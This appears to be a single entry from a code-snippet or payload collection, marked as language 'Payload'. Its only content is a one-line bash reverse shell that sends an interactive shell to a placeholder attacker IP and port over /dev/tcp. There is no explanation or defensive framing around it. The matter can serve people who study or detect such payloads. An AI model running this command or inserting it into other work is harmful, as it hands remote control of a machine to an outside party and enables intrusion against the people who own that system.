---
id: 5e5bd24f-d79b-4032-aaa5-27463827dcd3
type: code
language: Payload
verified: false
created_at: '2020-03-16T07:33:15.876428+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 5e5bd24f

**Language**: Payload

```payload
bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1
```
